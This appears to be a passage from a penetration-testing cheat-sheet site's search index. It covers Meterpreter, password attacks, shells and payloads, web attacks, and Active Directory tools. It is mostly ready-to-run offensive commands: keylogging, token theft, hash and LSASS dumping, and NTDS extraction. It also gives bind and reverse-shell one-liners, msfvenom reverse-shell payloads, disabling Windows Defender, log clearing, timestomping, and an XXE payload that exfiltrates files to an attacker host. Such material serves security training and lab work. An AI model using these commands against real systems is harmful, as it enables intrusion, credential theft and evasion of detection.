Meterpreter console.   <code>db_create &lt;name&gt;</code> Create a database to use with database-driven attacks (example: db_create autopwn).   <code>db_connect &lt;name&gt;</code> Create and connect to a database for driven attacks (example: db_connect autopwn).   <code>db_nmap</code> Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as \u2013sT \u2013v \u2013P0.)   <code>db_destroy</code> Delete the current database.   <code>db_destroy  &lt;user:password@host:port/database&gt;</code> Delete database using advanced options.","title":"MSFconsole Commands"},{"location":"cheat_sheets/msf/#meterpreter-commands","text":"Command Description     <code>help</code> Open Meterpreter usage help.   <code>run &lt;scriptname&gt;</code> Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.   <code>sysinfo</code> Show the system information on the compromised target.   <code>ls</code> List the files and folders on the target.   <code>use priv</code> Load the privilege extension for extended Meterpreter libraries.   <code>ps</code> Show all running processes and which accounts are associated with each process.   <code>migrate &lt;proc. id&gt;</code> Migrate to the specific process ID (PID is the target process ID gained from the ps command).   <code>use incognito</code> Load incognito functions. (Used for token stealing and impersonation on a target machine.)   <code>list_tokens -u</code> List available tokens on the target by user.   <code>list_tokens -g</code> List available tokens on the target by group.   <code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code> Impersonate a token available on the target.   <code>steal_token &lt;proc. id&gt;</code> Steal the tokens available for a given process and impersonate that token.   <code>drop_token</code> Stop impersonating the current token.   <code>getsystem</code> Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.   <code>shell</code> Drop into an interactive shell with all available tokens.   <code>execute -f &lt;cmd.exe&gt; -i</code> Execute cmd.exe and interact with it.   <code>execute -f &lt;cmd.exe&gt; -i -t</code> Execute cmd.exe with all available tokens.   <code>execute -f &lt;cmd.exe&gt; -i -H -t</code> Execute cmd.exe with all available tokens and make it a hidden process.   <code>rev2self</code> Revert back to the original user you used to compromise the target.   <code>reg &lt;command&gt;</code> Interact, create, delete, query, set, and much more in the target\u2019s registry.   <code>setdesktop &lt;number&gt;</code> Switch to a different screen based on who is logged in.   <code>screenshot</code> Take a screenshot of the target\u2019s screen.   <code>upload &lt;filename&gt;</code> Upload a file to the target.   <code>download &lt;filename&gt;</code> Download a file from the target.   <code>keyscan_start</code> Start sniffing keystrokes on the remote target.   <code>keyscan_dump</code> Dump the remote keys captured on the target.   <code>keyscan_stop</code> Stop sniffing keystrokes on the remote target.   <code>getprivs</code> Get as many privileges as possible on the target.   <code>uictl enable &lt;keyboard/mouse&gt;</code> Take control of the keyboard and/or mouse.   <code>background</code> Run your current Meterpreter shell in the background.   <code>hashdump</code> Dump all hashes on the target. use sniffer Load the sniffer module.   <code>sniffer_interfaces</code> List the available interfaces on the target.   <code>sniffer_dump &lt;interfaceID&gt; pcapname</code> Start sniffing on the remote target.   <code>sniffer_start &lt;interfaceID&gt; packet-buffer</code> Start sniffing with a specific range for a packet buffer.   <code>sniffer_stats &lt;interfaceID&gt;</code> Grab statistical information from the interface you are sniffing.   <code>sniffer_stop &lt;interfaceID&gt;</code> Stop the sniffer.   <code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code> Add a user on the remote target.   <code>add_group_user &lt;\"Domain Admins\"&gt; &lt;username&gt; -h &lt;ip&gt;</code> Add a username to the Domain Administrators group on the remote target.   <code>clearev</code> Clear the event log on the target machine.   <code>timestomp</code> Change file attributes, such as creation date (antiforensics measure).   <code>reboot</code> Reboot the target machine.","title":"Meterpreter Commands"},{"location":"cheat_sheets/password_attacks/","text":"","title":"Password Attacks"},{"location":"cheat_sheets/password_attacks/#connecting-to-target","text":"Command Description     <code>xfreerdp /v:&lt;ip&gt; /u: /p:</code> CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.   <code>evil-winrm -i &lt;ip&gt; -u user -p password</code> Uses Evil-WinRM to establish a Powershell session with a target.   <code>ssh user@&lt;ip&gt;</code> Uses SSH to connect to a target using a specified user.   <code>smbclient -U user \\\\\\\\&lt;ip&gt;\\\\SHARENAME</code> Uses smbclient to connect to an SMB share using a specified user.   <code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</code> Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.","title":"Connecting to Target"},{"location":"cheat_sheets/password_attacks/#password-mutations","text":"Command Description     <code>cewl https://www.LEGALCORP.com -d 4 -m 6 --lowercase -w LEGALCO.wordlist</code> Uses cewl to generate a wordlist based on keywords present on a website.   <code>hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</code> Uses Hashcat to generate a rule-based word list.   <code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code> Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.   <code>curl -s https://fileinfo.com/filetypes/compressed \\| html2text \\| awk '{print tolower($1)}' \\| grep \"\\.\" \\| tee -a compressed_ext.txt</code> Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.","title":"Password Mutations"},{"location":"cheat_sheets/password_attacks/#remote-password-attacks","text":"Command Description     <code>crackmapexec winrm &lt;ip&gt; -u user.list -p password.list</code> Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.   <code>crackmapexec smb &lt;ip&gt; -u \"user\" -p \"password\" --shares</code> Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.   <code>hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</code> Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.   <code>hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</code> Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.   <code>hydra -l user.list -p password &lt;service&gt;://&lt;ip&gt;</code> Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.   <code>hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</code> Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.   <code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code> Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.   <code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code> Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.   <code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code> Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.   <code>evil-winrm -i &lt;ip&gt;  -u  Administrator -H \"&lt;passwordhash&gt;\"</code> Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of <code>Pass-The-Hash</code> attack.","title":"Remote Password Attacks"},{"location":"cheat_sheets/password_attacks/#windows-local-password-attacks","text":"Command Description     <code>tasklist /svc</code> A command-line-based utility in Windows used to list running processes.   <code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code> Uses Windows command-line based utility findstr to search for the string \"password\" in many different file type.   <code>Get-Process lsass</code> A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.   <code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code> Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.   <code>pypykatz lsa minidump /path/to/lsassdumpfile</code> Uses Pypykatz to parse and attempt to extract credentials &amp; password hashes from an LSASS process memory dump file.   <code>reg.exe save hklm\\sam C:\\sam.save</code> Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\\sam, hklm\\security, hklm\\system).   <code>move sam.save \\\\&lt;ip&gt;\\NameofFileShare</code> Uses move in Windows to transfer a file to a specified file share over the network.   <code>python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code> Uses Secretsdump.py to dump password hashes from the SAM database.   <code>vssadmin CREATE SHADOW /For=C:</code> Uses Windows command line based tool vssadmin to create a volume shadow copy for <code>C:</code>. This can be used to make a copy of NTDS.dit safely.   <code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit</code> Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of <code>C:</code>.","title":"Windows Local Password Attacks"},{"location":"cheat_sheets/password_attacks/#linux-local-password-attacks","text":"Command Description     <code>for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done</code> Script that can be used to find .conf, .config and .cnf files on a Linux system.   <code>for i in $(find / -name *.cnf 2&gt;/dev/null \\| grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null \\| grep -v \"\\#\";done</code> Script that can be used to find credentials in specified file types.   <code>for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\\|man\";done</code> Script that can be used to find common database files.   <code>find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"</code> Uses Linux-based find command to search for text files.   <code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null \\| grep -v \"doc\\|lib\\|headers\\|share\";done</code> Script that can be used to search for common file types used with scripts.   <code>for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2&gt;/dev/null \\| grep -v \"lib\\|fonts\\|share\\|core\" ;done</code> Script used to look for common types of documents.   <code>cat /etc/crontab</code> Uses Linux-based cat command to view the contents of crontab in search for credentials.   <code>ls -la /etc/cron.*/</code> Uses Linux-based  ls -la command to list all files that start with <code>cron</code> contained in the etc directory.   <code>grep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null \\| grep \":1\"</code> Uses Linux-based command grep to search the file system for key terms <code>PRIVATE KEY</code> to discover SSH keys.   <code>grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null \\| grep \":1\"</code> Uses Linux-based grep command to search for the keywords <code>PRIVATE KEY</code> within files contained in a user's home directory.   <code>grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null \\| grep \":1\"</code> Uses Linux-based grep command to search for keywords <code>ssh-rsa</code> within files contained in a user's home directory.   <code>tail -n5 /home/*/.bash*</code> Uses Linux-based tail command to search the through bash history files and output the last 5 lines.   <code>python3 mimipenguin.py</code> Runs Mimipenguin.py using python3.   <code>bash mimipenguin.sh</code> Runs Mimipenguin.sh using bash.   <code>python2.7 lazagne.py all</code> Runs Lazagne.py with all modules using python2.7   <code>ls -l .mozilla/firefox/ \\| grep default</code> Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword <code>default</code> using grep.   <code>cat .mozilla/firefox/1bplpd86.default-release/logins.json \\| jq .</code> Uses Linux-based command cat to search for credentials stored by Firefox in JSON.   <code>python3.9 firefox_decrypt.py</code> Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.   <code>python3 lazagne.py browsers</code> Runs Lazagne.py browsers module using Python 3.","title":"Linux Local Password Attacks"},{"location":"cheat_sheets/password_attacks/#cracking-passwords","text":"Command Description     <code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code> Uses Hashcat to crack NTLM hashes using a specified wordlist.   <code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code> Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.   <code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code> Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.   <code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code> Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.   <code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code> Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.   <code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code> Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.   <code>ssh2john.pl SSH.private &gt; ssh.hash</code> Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.   <code>john ssh.hash --show</code> Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.   <code>office2john.py Protected.docx &gt; protected-docx.hash</code> Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.   <code>john --wordlist=rockyou.txt protected-docx.hash</code> Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.   <code>pdf2john.pl PDF.pdf &gt; pdf.hash</code> Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.   <code>john --wordlist=rockyou.txt pdf.hash</code> Runs John in conjunction with a wordlist to crack a pdf hash.   <code>zip2john ZIP.zip &gt; zip.hash</code> Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.   <code>john --wordlist=rockyou.txt zip.hash</code> Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.   <code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code> Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.   <code>file GZIP.gzip</code> Uses the Linux-based file tool to gather file format information.   <code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \\| tar xz;done</code> Script that runs a for-loop to extract files from an archive.","title":"Cracking Passwords"},{"location":"cheat_sheets/shells_payloads/","text":"Commands Description     <code>xfreerdp /v:10.129.x.x /u:user /p:password</code> CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol   <code>env</code> Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use   <code>sudo nc -lvnp &lt;port #&gt;</code> Starts a <code>netcat</code> listener on a specified port   <code>nc -nv &lt;ip address of computer with listener started&gt;&lt;port being listened on&gt;</code> Connects to a netcat listener at the specified IP address and port   <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \\| /bin/bash -i 2&gt;&amp;1 \\| nc -l 10.129.41.200 7777 &gt; /tmp/f</code> Uses netcat to bind a shell (<code>/bin/bash</code>) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on   <code>Set-MpPreference -DisableRealtimeMonitoring $true</code> Powershell command using to disable real time monitoring in <code>Windows Defender</code>   <code>use exploit/windows/smb/psexec</code> Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing <code>smb</code> &amp; <code>psexec</code>   <code>shell</code> Command used in a meterpreter shell session to drop into a <code>system shell</code>   <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; nameoffile.elf</code> <code>MSFvenom</code> command used to generate a linux-based reverse shell <code>stageless payload</code>   <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; nameoffile.exe</code> MSFvenom command used to generate a Windows-based reverse shell stageless payload   <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho &gt; nameoffile.macho</code> MSFvenom command used to generate a MacOS-based reverse shell payload   <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp &gt; nameoffile.asp</code> MSFvenom command used to generate a ASP web reverse shell payload   <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw &gt; nameoffile.jsp</code> MSFvenom command used to generate a JSP web reverse shell payload   <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war &gt; nameoffile.war</code> MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload   <code>use auxiliary/scanner/smb/smb_ms17_010</code> Metasploit exploit module used to check if a host is vulnerable to <code>ms17_010</code>   <code>use exploit/windows/smb/ms17_010_psexec</code> Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010   <code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code> Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting <code>rConfig 3.9.6</code>   <code>python -c 'import pty; pty.spawn(\"/bin/sh\")'</code> Python command used to spawn an <code>interactive shell</code> on a linux-based system   <code>/bin/sh -i</code> Spawns an interactive shell on a linux-based system   <code>perl \u2014e 'exec \"/bin/sh\";'</code> Uses <code>perl</code> to spawn an interactive shell on a linux-based system   <code>ruby: exec \"/bin/sh\"</code> Uses <code>ruby</code> to spawn an interactive shell on a linux-based system   <code>Lua: os.execute('/bin/sh')</code> Uses <code>Lua</code> to spawn an interactive shell on a linux-based system   <code>awk 'BEGIN {system(\"/bin/sh\")}'</code> Uses <code>awk</code> command to spawn an interactive shell on a linux-based system   <code>find / -name nameoffile 'exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;</code> Uses <code>find</code> command to spawn an interactive shell on a linux-based system   <code>find . -exec /bin/sh \\; -quit</code> An alternative way to use the <code>find</code> command to spawn an interactive shell on a linux-based system   <code>vim -c ':!/bin/sh'</code> Uses the text-editor <code>VIM</code> to spawn an interactive shell. Can be used to escape \"jail-shells\"   <code>ls -la &lt;path/to/fileorbinary&gt;</code> Used to <code>list</code> files &amp; directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute   <code>sudo -l</code> Displays the commands that the currently logged on user can run as <code>sudo</code>   <code>/usr/share/webshells/laudanum</code> Location of <code>laudanum webshells</code> on ParrotOS and attackhost   <code>/usr/share/nishang/Antak-WebShell</code> Location of <code>Antak-Webshell</code> on Parrot OS and attackhost","title":"Shells & Payloads"},{"location":"cheat_sheets/web_attacks/","text":"","title":"Web Attacks"},{"location":"cheat_sheets/web_attacks/#http-verb-tampering","text":"<p><code>HTTP Method</code>  - <code>HEAD</code>  - <code>PUT</code>  - <code>DELETE</code>  - <code>OPTIONS</code>  - <code>PATCH</code> </p>    Command Description     <code>-X OPTIONS</code> Set HTTP Method with Curl","title":"HTTP Verb Tampering"},{"location":"cheat_sheets/web_attacks/#idor","text":"<p><code>Identify IDORS</code>  - In <code>URL parameters &amp; APIs</code>  - In <code>AJAX Calls</code>  - By <code>understanding reference hashing/encoding</code>  - By <code>comparing user roles</code></p>    Command Description     <code>md5sum</code> MD5 hash a string   <code>base64</code> Base64 encode a string","title":"IDOR"},{"location":"cheat_sheets/web_attacks/#xxe","text":"Code Description     <code>&lt;!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"&gt;</code> Define External Entity to a URL   <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> Define External Entity to a file path   <code>&lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;</code> Read PHP source code with base64 encode filter   <code>&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;</code> Reading a file through a PHP error   <code>&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;</code> Reading a file OOB exfiltration","title":"XXE"},{"location":"cheat_sheets/web_requests/","text":"Command Description      <code>curl http://LEGALCORP.com</code> GET request with <code>cURL</code>    <code>curl http://LEGALCORP.com -v</code> Verbose GET request with <code>cURL</code>   <code>curl http://admin:password@LEGALCORP.com/ -vvv</code> <code>cURL</code> Basic Auth login   <code>curl -u admin:password  http://LEGALCORP.com/ -vvv</code> Alternate <code>cURL</code> Basic Auth login   <code>curl -u admin:password -L http://LEGALCORP.com/</code> <code>cURL</code> Basic Auth login, follow redirection   <code>curl -u admin:password 'http://LEGALCORP.com/search.php?port_code=us'</code> <code>cURL</code> GET request with parameter   <code>curl -d 'username=admin&amp;password=password' -L http://LEGALCORP.com/login.php</code> POST request with <code>cURL</code>   <code>curl -d 'username=admin&amp;password=password' -L  http://LEGALCORP.com/login.php -v</code> Debugging with <code>cURL</code>   <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar /dev/null  http://LEGALCORP.com/login.php -v</code> Cookie usage with <code>cURL</code>   <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar cookies.txt  http://LEGALCORP.com/login.php</code> <code>cURL</code> with cookie file   <code>curl -H 'Content-Type: application/json' -d '{ \"username\" : \"admin\", \"password\" : \"password\" }'</code> <code>cURL</code> specify content type   <code>curl -X OPTIONS http://LEGALCORP.com/ -vv</code> <code>cURL</code> OPTIONS request   <code>curl -X PUT -d @test.txt http://LEGALCORP.com/test.txt -vv</code> File upload with <code>cURL</code>   <code>curl -X DELETE http://LEGALCORP.com/test.txt -vv</code> DELETE method with <code>cURL</code>","title":"Web requests"},{"location":"cheat_sheets/windows/","text":"Command Description     <code>xfreerdp /v:&lt;target IP address&gt; /u:user /p:&lt;password&gt;</code> RDP to lab target    <code>Get-WmiObject -Class win32_OperatingSystem</code> Get information about the operating system   <code>dir c:\\ /a</code> View all files and directories in the c: root directory   <code>tree &lt;directory&gt;</code> Graphically displaying the directory structure of a path   <code>tree c:\\ /f \\| more</code> Walk through results of the <code>tree</code> command page by page   <code>icacls &lt;directory&gt;</code> View the permissions set on a directory   <code>icacls c:\\users /grant joe:f</code> Grant a user full permissions to a directory   <code>icacls c:\\users /remove joe</code> Remove a users' permissions on a directory   <code>Get-Service</code> <code>PowerShell</code> cmdlet to view running services   <code>help &lt;command&gt;</code> Display the help menu for a specific command   <code>get-alias</code> List <code>PowerShell</code> aliases   <code>New-Alias -Name \"Show-Files\" Get-ChildItem</code> Create a new <code>PowerShell</code> alias   <code>Get-Module \\| select Name,ExportedCommands \\| fl</code> View imported <code>PowerShell</code> modules and their associated commands   <code>Get-ExecutionPolicy -List</code> View the <code>PowerShell</code> execution policy   <code>Set-ExecutionPolicy Bypass -Scope Process</code> Set the <code>PowerShell</code> execution policy to bypass for the current session   <code>wmic os list brief</code> Get information about the operating system with <code>wmic</code>   <code>Invoke-WmiMethod</code> Call methods of <code>WMI</code> objects   <code>whoami /user</code> View the current users' SID   <code>reg query &lt;key&gt;</code> View information about a registry key   <code>Get-MpComputerStatus</code> Check which <code>Defender</code> protection settings are enabled   <code>sconfig</code> Load Server Configuration menu in Windows Server Core","title":"Windows"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/","text":"","title":"Cheat Sheet IAD"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#general-commands","text":"<p><code>Get-Module</code> Returns a list of loaded PowerShell Modules.  </p> <p><code>Get-Command -Module ActiveDirectory</code> Lists commands for the module specified.  </p> <p><code>Get-Help &lt;cmd-let&gt;</code> Shows help syntax for the cmd-let specified.  </p> <p><code>Import-Module ActiveDirectory</code> Imports the Active Directory Module</p>","title":"General Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#active-directory-powershell-commands","text":"","title":"Active Directory PowerShell Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#ad-user-commands","text":"<p><code>New-ADUser -Name \"first last\" -Accountpassword (Read-Host -AsSecureString \"Super$ecurePassword!\") -Enabled $true -OtherAttributes @{'title'=\"Analyst\";'mail'=\"f.last@domain.com\"}</code> Add a user to AD and set attributes.  </p> <p><code>Remove-ADUser -Identity &lt;name&gt;</code> Removes a user from AD with the identity of 'name'.  </p> <p><code>Unlock-ADAccount -Identity &lt;name&gt;</code> Unlocks a user account with the identity of 'name'.  </p> <p><code>Set-ADAccountPassword -Identity &lt;'name'&gt; -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \"NewP@ssw0rdReset!\" -Force)</code> Set the password of an AD user to the password specified.  </p> <p><code>Set-ADUser -Identity amasters -ChangePasswordAtLogon $true</code> Force a user to change their password at next logon attempt.  </p>","title":"AD User Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#ad-group-commands","text":"<p><code>New-ADOrganizationalUnit -Name \"name\" -Path \"OU=folder,DC=domain,DC=local\"</code> Create a new AD OU container named \"name\" in the path specified.  </p> <p><code>New-ADGroup -Name \"name\" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName \"Security Analysts\" -Path \"CN=Users,DC=domain,DC=local\" -Description \"Members of this group are Security Analysts under the IT OU\"</code> Create a new security group named \"name\" with the accompanying attributes.  </p> <p><code>Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto'</code> Add an AD user to the group specified.  </p>","title":"AD Group Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#gpo-commands","text":"<p><code>Copy-GPO -SourceName \"GPO to copy\" -TargetName \"Name\"</code> Copy a GPO for use as a new GPO with a target name of \"name\".  </p> <p><code>Set-GPLink -Name \"Security Analysts Control\" -Target \"ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=LEGALCORP,dc=LOCAL\" -LinkEnabled Yes</code> Link a GPO for use to a specific OU or security group.  </p>","title":"GPO Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#computer-commands","text":"<p><code>Add-Computer -DomainName 'legalcorp.local' -Credential 'LEGALCORP\\user_adm' -Restart</code> Add a new computer to the domain using the credentials specified.  </p> <p><code>Add-Computer -ComputerName 'name' -LocalCredential '.\\localuser' -DomainName 'legalcorp.local' -Credential 'LEGALCORP\\user_adm' -Restart</code> Remotely add a computer to a domain.  </p> <p><code>Get-ADComputer -Identity \"name\" -Properties * | select CN,CanonicalName,IPv4Address</code> Check for a computer named \"name\" and view its properties.  </p>","title":"Computer Commands"},{"location":"cheat_sheets/active_directory/cheatsheet_aid/#references","text":"<p>Microsoft </p>","title":"References"},{"location":"cheat_sheets/active_directory/enumeration_and_attacks/","text":"Tool Description     PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some \"quick wins\" such as users that can be attacked via Kerberoasting or ASREPRoasting.   BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.   SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.   BloodHound.py A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis.   Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing.   Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.   Responder Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions.   Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.   C# Inveigh (InveighZero) The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes.   rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.   CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to \"live off the land\" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL.   Rubeus Rubeus is a C# tool built for Kerberos Abuse.   GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users.   Hashcat A great hashcracking and password recovery tool.   enum4linux A tool for enumerating information from Windows and Samba systems.   enum4linux-ng A rework of the original Enum4linux tool that works a bit differently.   ldapsearch Built in interface for interacting with the LDAP protocol.   windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.   DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.   LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).   smbmap SMB share enumeration across a domain.   psexec.py Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell.   wmiexec.py Part of Impacket toolset, it provides the capability of command execution over WMI.   Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.   smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.   setspn.exe Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.   Mimikatz Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host.   secretsdump.py Remotely dump SAM and LSA secrets from a host.   evil-winrm Provides us with an interactive shell on host over the WinRM protocol.   mssqlclient.py Part of Impacket toolset, it provides the ability to interact with MSSQL databases.   noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.   rpcdump.py Part of the Impacket toolset, RPC endpoint mapper.   CVE-2021-1675.py Printnightmare PoC in python.   ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks.   PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to 